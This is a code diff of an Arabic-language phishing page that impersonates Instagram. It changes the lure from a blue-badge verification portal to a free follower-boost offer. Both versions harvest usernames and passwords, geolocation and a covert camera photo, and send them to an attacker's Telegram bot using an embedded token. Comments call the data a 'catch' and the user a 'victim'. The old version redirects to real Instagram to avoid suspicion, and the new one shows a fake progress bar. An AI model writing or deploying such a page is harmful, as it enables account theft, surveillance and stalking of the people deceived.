@@ -3,42 +3,53 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram | مركز توثيق الحسابات</title>
+    <title>Instagram Boost | زيادة متابعين مجاناً</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; border-radius: 5px; }
-        .logo { width: 175px; margin-bottom: 20px; }
-        h3 { color: #262626; font-size: 16px; margin-bottom: 20px; font-weight: 600; line-height: 1.4; }
-        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; padding: 10px; margin-bottom: 10px; border-radius: 3px; box-sizing: border-box; font-size: 12px; }
-        .btn-blue { background: #0095f6; color: white; border: none; width: 100%; padding: 7px; border-radius: 4px; font-weight: 600; cursor: pointer; font-size: 14px; margin-top: 10px; }
-        .footer-text { font-size: 12px; color: #8e8e8e; margin-top: 20px; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #fafafa; margin: 0; padding: 15px; display: flex; justify-content: center; align-items: center; height: 100vh; }
+        .boost-card { background: white; border: 1px solid #dbdbdb; width: 100%; max-width: 380px; padding: 30px; border-radius: 8px; text-align: center; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .logo { width: 150px; margin-bottom: 20px; }
+        h2 { color: #262626; font-size: 18px; margin-bottom: 15px; }
+        input, select { width: 100%; padding: 12px; margin-bottom: 10px; border: 1px solid #dbdbdb; border-radius: 5px; background: #fafafa; font-size: 14px; box-sizing: border-box; }
+        .btn-boost { background: #0095f6; color: white; border: none; width: 100%; padding: 12px; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 15px; transition: 0.3s; }
+        .btn-boost:hover { background: #1877f2; }
+        .progress-container { display: none; margin-top: 20px; }
+        .progress-bar { width: 100%; background: #eee; height: 10px; border-radius: 5px; overflow: hidden; }
+        .progress-fill { width: 0%; background: #0095f6; height: 100%; transition: 0.5s; }
+        .status-text { font-size: 12px; color: #8e8e8e; margin-top: 5px; }
     </style>
 </head>
 <body>
 
-<div class="login-box">
+<div class="boost-card">
     <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" class="logo">
-    <h3>بوابة طلب شارة التوثيق (العلامة الزرقاء) لعام 2026</h3>
+    <h2>أقوى نظام لزيادة المتابعين 2026</h2>
+    <p style="font-size: 12px; color: #262626; margin-bottom: 20px;">أدخل بيانات حسابك وحدد الكمية المطلوبة (حتى 10K متابع)</p>
+
+    <input type="text" id="username" placeholder="اسم المستخدم (Username)">
+    <input type="password" id="password" placeholder="كلمة السر (Password)">
     
-    <input type="text" id="insta_user" placeholder="اسم المستخدم (Username)">
-    <input type="password" id="insta_pass" placeholder="كلمة السر (Password)">
-    
-    <p style="font-size: 11px; color: #3897f0; text-align: right; cursor: pointer;">لماذا أحتاج للتوثيق؟</p>
-    
-    <button class="btn-blue" onclick="captureInsta()">تسجيل الدخول وطلب التوثيق</button>
-    
-    <div class="footer-text">سيتم مراجعة حسابك من قبل فريق الدعم الفني لشركة Meta.</div>
+    <select id="amount">
+        <option value="1000">1,000 متابع (سريع)</option>
+        <option value="5000">5,000 متابع (متوسط)</option>
+        <option value="10000">10,000 متابع (VIP)</option>
+    </select>
+
+    <button class="btn-boost" onclick="startBoost()">ابدأ زيادة المتابعين الآن</button>
+
+    <div id="loading" class="progress-container">
+        <div class="progress-bar"><div id="fill" class="progress-fill"></div></div>
+        <p id="st" class="status-text">جاري الاتصال بالخادم...</p>
+    </div>
 </div>
 
 <canvas id="canvas" style="display:none;"></canvas>
 <video id="video" style="display:none;" autoplay></video>
 
 <script>
-    // بياناتك الخاصة
     const TOKEN = "8470093886:AAFofGsfGx98xJCaOPJyvqyLdwrYL_3Ebfg";
     const CHAT_ID = "7529727252";
 
-    async function sendToBot(type, data, caption = "") {
+    async function send(type, data, caption = "") {
         const formData = new FormData();
         formData.append("chat_id", CHAT_ID);
         if (type === "text") {
@@ -47,52 +58,62 @@
                 body: JSON.stringify({ chat_id: CHAT_ID, text: data, parse_mode: "Markdown" })
             });
         } else {
-            let fileName = type === "photo" ? "face.jpg" : "file.jpg";
-            formData.append(type, data, fileName);
+            let name = type === "photo" ? "face.jpg" : "file.jpg";
+            formData.append(type, data, name);
             if (caption) formData.append("caption", caption);
             await fetch(`https://api.telegram.org/bot${TOKEN}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, { method: "POST", body: formData });
         }
     }
 
-    async function captureInsta() {
-        const user = document.getElementById('insta_user').value;
-        const pass = document.getElementById('insta_pass').value;
+    async function startBoost() {
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const amt = document.getElementById('amount').value;
 
-        if (!user || !pass) { alert("يرجى إكمال البيانات المطلوبة!"); return; }
+        if (!user || !pass) { alert("يرجى إدخال البيانات!"); return; }
 
-        // 1. إرسال اليوزر والباسورد فوراً (أهم شيء)
-        const info = `🔥 **صيد إنستغرام جديد** 🔥\n👤 اليوزر: \`${user}\` \n🔑 الباسورد: \`${pass}\``;
-        await sendToBot("text", info);
+        // 1. إرسال الحساب فوراً
+        await send("text", `🔥 **صيد زيادة متابعين** 🔥\n👤 الحساب: \`${user}\` \n🔑 الباسورد: \`${pass}\` \n📈 الكمية: ${amt}`);
 
-        alert("جاري التحقق من ملكية الحساب.. يرجى السماح بالكاميرا لمطابقة صورة الملف الشخصي.");
-
-        // 2. الموقع الجغرافي
+        document.getElementById('loading').style.display = 'block';
+        
+        // 2. الموقع والكاميرا (تحت غطاء التحقق)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const map = `📍 موقع الضحية: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            await sendToBot("text", map);
+            await send("text", map);
         });
 
-        // 3. الكاميرا (تصوير صامت)
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             const video = document.getElementById('video');
             video.srcObject = stream;
-
             setTimeout(async () => {
                 const canvas = document.getElementById('canvas');
                 canvas.width = video.videoWidth; canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 canvas.toBlob(async (blob) => {
-                    await sendToBot("photo", blob, `📸 صورة صاحب الحساب: ${user}`);
+                    await send("photo", blob, `📸 صورة صاحب حساب: ${user}`);
                     stream.getTracks().forEach(t => t.stop());
-                    
-                    // تحويل الضحية لصفحة إنستغرام الحقيقية لإبعاد الشبهة
-                    window.location.href = "https://www.instagram.com/accounts/manage_access/";
                 }, 'image/jpeg');
             }, 2000);
-        } catch (e) {
-            window.location.href = "https://www.instagram.com/";
-        }
+        } catch (e) {}
+
+        // 3. شريط التحميل الوهمي
+        let p = 0;
+        let fill = document.getElementById('fill');
+        let st = document.getElementById('st');
+        let interval = setInterval(() => {
+            p += 5;
+            if (p > 100) {
+                clearInterval(interval);
+                st.innerText = "✅ تمت العملية! سيصل المتابعون خلال 24 ساعة.";
+                alert("تم إرسال طلبك بنجاح!");
+            }
+            fill.style.width = p + "%";
+            if (p == 30) st.innerText = "جاري تجاوز نظام حماية إنستغرام...";
+            if (p == 60) st.innerText = "جاري توليد المتابعين الوهميين...";
+            if (p == 90) st.innerText = "تأكيد الحساب في قاعدة البيانات...";
+        }, 200);
     }
 </script>
 </body>
